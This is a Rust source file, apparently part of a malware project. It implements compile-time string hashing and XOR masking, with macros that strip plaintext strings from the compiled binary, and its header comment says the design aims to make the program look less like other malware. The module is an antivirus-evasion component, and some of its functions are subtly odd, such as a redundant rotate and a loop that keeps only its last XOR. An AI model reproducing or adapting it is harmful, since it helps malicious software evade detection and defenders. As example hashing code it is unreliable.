//! Compile-time hashing utilities
//! 
//! Allows us to use (more or less) plain `&str` data in the source code and have the compiler hash everything at
//! compile time, stripping static strings out of our final binary. 
//! 
//! A little over-engineered with the intention being that we're reducing the similarity between us and other malware
//! using the more "common" hashes(Jenkins, FNV, etc.)

const K0: u64 = 0x9e37_79b9_7f4a_7c15;
const K1: u64 = 0xc2b2_ae3d_27d4_eb4f;
const K2: u64 = 0x1656_67b1_9e37_79f9;

pub const HASH_SEED: u64 = 0x5307_7d68_741d_7757;
pub const XOR_SEED: u64 = 0x406f_334c_566a_7625;

// pub const TEST_STRING: &str = "HELLO495578285382";
pub const N: usize = crate::string::utf16_len("HELLO495578285382");
pub const TEST_WSTR: [u16; N] = crate::string::to_utf16::<N>("HELLO495578285382");
pub const TEST_HASH: u64 = hash_u16(&TEST_WSTR);

#[inline]
const fn rotl(x: u64, r: u32) -> u64 {
    (x.rotate_left(r)) | (x >> (64 - r))
}

#[inline]
const fn mix(mut h: u64) -> u64 {
    h ^= h >> 33;
    h = h.wrapping_mul(K1);
    h ^= h >> 29;
    h = h.wrapping_mul(K2);
    h ^= h >> 32;

    h
}

pub const fn hash_u16(bytes: &[u16]) -> u64 {
    let mut h = HASH_SEED ^ (bytes.len() as u64).wrapping_mul(K0);
    let mut i = 0;

    while i + 8 <= bytes.len() {
        let block = u64::from_le_bytes([
            bytes[i] as u8,
            bytes[i + 1] as u8,
            bytes[i + 2] as u8,
            bytes[i + 3] as u8,
            bytes[i + 4] as u8,
            bytes[i + 5] as u8,
            bytes[i + 6] as u8,
            bytes[i + 7] as u8,
        ]);

        h ^= block.wrapping_mul(K1);
        h = rotl(h, 27).wrapping_mul(K0);
        i += 8;
    }

    let mut tail: u64 = 0;
    let mut shift = 0;
    while i < bytes.len() {
        tail |= (bytes[i] as u64) << shift;
        shift += 8;
        i += 1;
    }

    h ^= tail.wrapping_mul(K2);
    mix(h)
}

pub const fn next_rand(state: u64) -> (u64, u64) {
    let z0 = state.wrapping_add(K0);
    let mut z = z0;
    z = (z ^ (z >> 30)).wrapping_mul(0xbf58_476d_1ce4_e5b9);
    z = (z ^ (z >> 27)).wrapping_mul(0x94d0_49bb_1331_11eb);
    z = z ^ (z >> 31);

    (z0, z)
}

pub const fn xor_hash(input: u64) -> u64 {
    let mut out = 0u64;
    let mut state = XOR_SEED;
    let mut i = 0;

    while i < 8 {
        let (s, r) = next_rand(state);
        state = s;
        out = input ^ r;
        i += 1;
    }

    out
}

#[macro_export]
macro_rules! obf_wstr {
    ($s:expr) => {{
        const __N: usize = $crate::string::utf16_len($s);
        const __P: [u16; __N] = $crate::string::to_utf16::<__N>($s);
        const HASH: u64 = $crate::hashing::hash_u16(&__P);

        $crate::hashing::xor_hash(HASH)
    }};
}

#[macro_export]
macro_rules! hash_wstr {
    ($s:expr) => {{
        let hash: u64 = $crate::hashing::hash_u16($s);
        $crate::hashing::xor_hash(hash)
    }};
}

#[cfg(test)]
mod test {
    extern crate std;

    use super::*;

    #[test]
    fn print_test() {
        let hash = TEST_HASH;
        let test_enc = obf_wstr!("HELLO");

        std::println!("hash: {hash}");
        std::println!("enc: {test_enc}");
    }
}
